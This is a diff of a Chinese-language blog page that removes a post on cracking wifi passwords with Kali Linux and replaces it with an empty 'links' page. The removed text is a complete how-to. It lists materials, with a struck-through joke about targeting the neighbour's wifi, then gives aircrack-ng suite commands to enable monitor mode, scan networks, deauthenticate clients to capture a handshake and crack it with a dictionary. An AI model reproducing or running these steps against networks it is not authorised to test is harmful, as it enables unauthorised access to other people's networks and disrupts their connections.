@@ -82,62 +82,17 @@
 	<div class="advertise"></div> -->
 	<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=100% height=110 src="//music.163.com/outchain/player?type=0&id=8555115352&auto=true&height=90"></iframe>
 </div>
-    <title>kali+无线网卡破解wifi密码</title>
+    <title>links</title>
 <div id="title">
 	<div id="title-img"></div>
 	<div id="title-text">
-		<h1>kali+无线网卡破解wifi密码</h1>
+		<h1>links</h1>
 	</div>
 </div>
 <div id="content">
 	<div class="post">
 		
-		<h1 id="材料准备"><a href="#材料准备" class="headerlink" title="材料准备"></a>材料准备</h1><ol>
-<li>安装有kali虚拟机的电脑，最好别用wsl（会有一些莫名其妙的错误）</li>
-<li>无线网卡一枚（最好免驱），网购约30元，我使用的是mt7601u</li>
-<li>字典（自己生成或者网上下载如Top100）</li>
-<li><del>邻居家的wifi</del></li>
-</ol>
-<h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><h2 id="将无线网卡连接至虚拟机"><a href="#将无线网卡连接至虚拟机" class="headerlink" title="将无线网卡连接至虚拟机"></a>将无线网卡连接至虚拟机</h2><p>请务必先打开kali虚拟机后，后将无线网卡插上电脑。</p>
-<p>这样在VMwwre中才会出现一个弹窗“检测到新的usb设备”选择“连接到虚拟机”，选中你的虚拟机点确定</p>
-<p>打开终端，输入<code>ifconfig</code>，如果列出的表中有<code>wlan0</code>，则说明无线网卡已经成功连接到kali虚拟机中</p>
-<h2 id="开启监听模式"><a href="#开启监听模式" class="headerlink" title="开启监听模式"></a>开启监听模式</h2><p>首先获取root权限</p>
-<pre><code class="hljs bash">sudo su</code></pre>
-
-<p>开启网卡监听</p>
-<pre><code class="hljs bash">airmon-ng start wlan0</code></pre>
-
-<p>查看是否监听成功</p>
-<pre><code class="hljs bash">ifconfig</code></pre>
-
-<p>扫描附近的wifi，搜索到你要破解的wifi时及时按下<code>空格</code>暂停扫描，以免扫描的东西不见了</p>
-<pre><code class="hljs bash">airodump-ng wlan0</code></pre>
-<table>
-<thead>
-<tr>
-<th align="center">BSSID</th>
-<th align="center">CH</th>
-<th align="center">ESSID</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">wifi的网卡</td>
-<td align="center">信道</td>
-<td align="center">wifi的名字</td>
-</tr>
-</tbody></table>
-<p>查看wifi连接的设备</p>
-<pre><code class="hljs bash">airodump-ng --bssid &lt;BSSID&gt; -c &lt;CH&gt; -w &lt;文件名不用自己加后缀&gt; wlan0</code></pre>
-
-<p>抓包</p>
-<pre><code class="hljs bash">aireplay-ng -0 2 -a &lt;BSSID&gt; -c &lt;STATION&gt; wlan0</code></pre>
-<p>参数说明：-0抓取包的个数，-a路由器MAC，-c用户MAC</p>
-<p>破解wifi密码，跑包，如果密码字典中有密码，即可破解成功</p>
-<pre><code class="hljs bash">aircrack-ng -w &lt;字典路径&gt; &lt;文件名不用自己加后缀&gt;</code></pre>
-
-<p>停止监听</p>
-<pre><code class="hljs bash">airmon stop wlan0</code></pre>
-
+		
 		
 	</div>
 </div>
